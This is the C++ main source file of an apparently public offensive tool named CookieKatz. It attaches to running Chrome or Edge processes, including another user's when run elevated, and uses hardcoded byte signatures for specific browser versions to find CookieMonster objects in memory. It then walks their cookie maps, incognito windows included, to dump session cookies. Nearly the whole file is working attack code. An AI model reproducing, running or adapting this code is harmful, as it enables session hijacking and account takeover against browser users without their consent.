#include <stdio.h>
#include <Windows.h>
#include <shlwapi.h>

#include "Helper.h"
#include "Process.h"
#include "Memory.h"

void banner() { //This is important
    printf(" _____             _    _      _   __      _       \n");
    printf("/  __ \\           | |  (_)    | | / /     | |      \n");
    printf("| /  \\/ ___   ___ | | ___  ___| |/ /  __ _| |_ ____\n");
    printf("| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
    printf("| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
    printf(" \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
    printf("By Meckazin                     github.com / Meckazin \n");
};

void usage() {
    printf("Help!\n\n");
    printf("Examples:\n");
    printf(".\\CookieKatz.exe\n");
    printf("    By default targets first available Chrome process\n");
    printf(".\\CookieKatz.exe /edge\n");
    printf("    Targets first available Edge process\n");
    printf(".\\CookieKatz.exe /pid:<pid>\n");
    printf("    Attempts to target given pid (remember to use flag: edge if the target is Edge)\n");
    printf("\n");
    printf("Flags:\n");
    printf("    /edge    Target current user Edge process\n");
    printf("    /pid     Attempt to dump given pid, for example, someone else's if running elevated\n");
    printf("    /list    List targettable processes, use with /edge to target Edge\n");
    printf("    /help    This what you just did! -h works as well\n");
}

/*
Tested on
Edge:
    Version 118.0.2088.46 (Official build) (64-bit)
    Version 119.0.2151.97 (Official build) (64-bit)
    Version 120.0.2210.61 (Official build) (64-bit)
Chrome:
    Version 117.0.5938.152 (Official build) (64-bit)
    Version 120.0.6099.109 (Official Build) (64-bit)
    Version 120.0.6099.110 (Official Build) (64-bit)
*/

#pragma comment(lib,"shlwapi.lib")
int main(int argc, char* argv[]) {
    banner();
	printf("Kittens love cookies too!\n\n");

    BOOL chrome = TRUE;
    BOOL ProcessList = FALSE;
    DWORD pid = 0;

    //Jump over the program name
    for (size_t i = 1; i < argc; i++)
    {
        if (StrStrIA(argv[i], "pid:") != NULL)
        {
            //Split and take pid
            const char* colonPos = strchr(argv[i], ':');
            size_t pidLen = strlen(colonPos + 1);
            char* remainder = new char[pidLen + 1];
            strcpy_s(remainder, pidLen + 1, colonPos + 1);
            if (sscanf_s(remainder, "%lu", &pid) == 0) {
                printf("[-] Failed to parse command line argument /pid!");
                return 1;
            }
        }
        if (StrStrIA(argv[i], "edge") != NULL)
            chrome = FALSE;
        if (StrStrIA(argv[i], "list") != NULL)
            ProcessList = TRUE;
        if (StrStrIA(argv[i], "help") != NULL) {
            usage();
            return 0;
        }
        if (StrStrIA(argv[i], "-h") != NULL) {
            usage();
            return 0;
        }
    }

    HANDLE hChrome = NULL;
    //If some PID was given
    if (pid != 0)
    {
        if (!GetProcessHandle(pid, &hChrome))
        {
            printf("[-] Failed to get process handle to PID: %lu\n",pid);
            return 1;
        }
        if (!GetProcessName(hChrome, chrome))
        {
            printf("[-] Failed to get process handle to PID: %lu\n", pid);
            return 1;
        }
    }

    LPCWSTR processName;
    LPCWSTR dllName;
    size_t szPattern = 0;
    //0xAA is a wild card that matches any byte
    //Pattern is the implementation of the function net::CookieMonster::~CookieMonster(void)
    //We use that to find the contents of Virtual Function Pointer struct (__vfptr)
    //Each instance of CookieMonster comes with one
    BYTE* pattern;
    if (chrome)
    {
        printf("[*] Targeting Chrome\n");
        processName = L"chrome.exe";
        dllName = L"chrome.dll";
        szPattern = 105;
        pattern = new BYTE[105]{
            0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 
            0xCE, 0xE8, 0xAA, 0xAA, 0xFF, 0xFF, 0x85, 0xFF, 0x74, 0x08, 
            0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xFD, 0x48, 0x89, 
            0xF0, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 
            0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x41, 0x56, 
            0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x4D, 0x89, 
            0xCE, 0x4C, 0x89, 0xC7, 0x48, 0x89, 0xD6, 0x48, 0x89, 0xCB, 
            0x49, 0x8B, 0x01, 0x48, 0x8B, 0x11, 0x48, 0x8B, 0x0E, 0xFF, 
            0x15, 0xAA, 0xAA, 0xAA, 0x05, 0x89, 0xC5, 0x49, 0x8B, 0x06, 
            0x48, 0x8B, 0x16, 0x48, 0x8B, 0x0F, 0xFF, 0x15, 0xAA, 0xAA, 
            0xAA, 0x05, 0x40, 0x84, 0xED
        };
    }
    else {
        printf("[*] Targeting Edge\n");
        processName = L"msedge.exe";
        dllName = L"msedge.dll";
        szPattern = 144;
        pattern = new BYTE[144]{
            0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 
            0xCE, 0xE8, 0xAA, 0xAA, 0xFF, 0xFF, 0x85, 0xFF, 0x74, 0x08, 
            0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 
            0xF0, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 
            0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x41, 0x56, 
            0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x19, 
            0x4C, 0x8B, 0x33, 0x4D, 0x85, 0xF6, 0x74, 0x09, 0x48, 0x89, 
            0xCE, 0x48, 0x8B, 0x7B, 0x08, 0xEB, 0x16, 0x48, 0x83, 0xC4, 
            0x28, 0xAA, 0xAA, 0xAA, 0x41, 0x5E, 0xC3, 0x48, 0x83, 0xC7, 
            0xF8, 0x48, 0x89, 0xF9, 0xE8, 0x1D, 0x00, 0x00, 0xAA, 0xAA, 
            0xAA, 0xF7, 0x75, 0xEF, 0x4C, 0x89, 0x73, 0x08, 0x48, 0x8B, 
            0x06, 0x48, 0x8B, 0x08, 0x48, 0x83, 0xC4, 0x28, 0x5B, 0x5F, 
            0x5E, 0x41, 0x5E, 0xE9, 0xAA, 0xAA, 0xAA, 0xAA, 0x56, 0x48, 
            0x83, 0xEC, 0x20, 0x48, 0x85, 0xC9, 0x74, 0x2A, 0x48, 0x8B, 
            0x31, 0x48, 0xC7, 0x01
        };
    }

    if (ProcessList)
    {
        printf("[*] Listing targetable processes\n");
        FindAllSuitableProcesses(processName);
        printf("[+] Done\n");
        return 0;
    }

    //If pid was not given, now we go and find the process and handle
    if (pid == 0)
    {
        if (!FindCorrectProcessPID(processName, &pid, &hChrome) || hChrome == NULL)
        {
            printf("[-] Failed to find right process\n");
            return 1;
        }
    }
#ifdef _DEBUG
    wprintf(TEXT("[*] Targeting process PID: %d\n"), pid);
#endif


    uintptr_t baseAddress = 0;
    DWORD moduleSize = 0;
    if (!GetRemoteModuleBaseAddress(hChrome, dllName, baseAddress, &moduleSize))
    {
        printf("[-] Failed to find %ls base address!\n", dllName);
        CloseHandle(hChrome);
        return 1;
    }

    uintptr_t resultAddress = 0;
    if (!FindDllPattern(hChrome, pattern, szPattern, baseAddress, moduleSize, resultAddress)) {
        printf("[-] Failed to find the first pattern!\n");
        CloseHandle(hChrome);
        return 1;
    }

#ifdef _DEBUG
    wprintf(TEXT("[*] Found first pattern on 0x%p\n"), (void*)resultAddress);
#endif
    BYTE secondPattern[sizeof(uintptr_t)];
    ConvertToByteArray(resultAddress, secondPattern, sizeof(uintptr_t));

    if (!FindDllPattern(hChrome, secondPattern, sizeof(uintptr_t), baseAddress, moduleSize, resultAddress)) {
        printf("[-] Failed to find the second pattern!\n");
        CloseHandle(hChrome);
        return 1;
    }
#ifdef _DEBUG
    wprintf(TEXT("[*] Found second pattern on 0x%p\n"), (void*)resultAddress);
#endif
    BYTE thirdPattern[sizeof(uintptr_t)];
    ConvertToByteArray(resultAddress, thirdPattern, sizeof(uintptr_t));

    uintptr_t* CookieMonsterInstances = (uintptr_t*)malloc(sizeof(uintptr_t)*100); //There is no person with computer RAM enough to run more than 100 chrome instances :D
    size_t szCookieMonster = 0;
    if (CookieMonsterInstances == NULL || !FindPattern(hChrome, thirdPattern, sizeof(uintptr_t), CookieMonsterInstances, szCookieMonster)) {
        printf("[-] Failed to find the third pattern!\n");
        CloseHandle(hChrome);
        free(CookieMonsterInstances);
        return 1;
    }
#ifdef _DEBUG
    wprintf(TEXT("[*] Found %zu instances of CookieMonster!\n"), szCookieMonster);

    for (size_t i = 0; i < szCookieMonster; i++)
        wprintf(TEXT("[*] Found CookieMonster on 0x%p\n"), (void*)CookieMonsterInstances[i]);
#endif

    //I don't know that the first instance of the CookieMonster is supposed to be, but the CookieMap for it seems to always be empty
    //Each incognito window will have their own instance of the CookieMonster, and that is why we need to find and loop them all
    for (size_t i = 1; i < szCookieMonster; i++)
    {
        if (CookieMonsterInstances == NULL || CookieMonsterInstances[i] == NULL)
            break;
        uintptr_t CookieMapOffset = 0x28; //This offset is fixed since the data just is there like it is
        CookieMapOffset += CookieMonsterInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
#ifdef _DEBUG
        wprintf(TEXT("[*] CookieMap should be found in address 0x%p\n"), (void*)CookieMapOffset);
#endif
        WalkCookieMap(hChrome, CookieMapOffset);
    }

    CloseHandle(hChrome);
    free(CookieMonsterInstances);

    printf("[+] Done\n");
    return 0;
}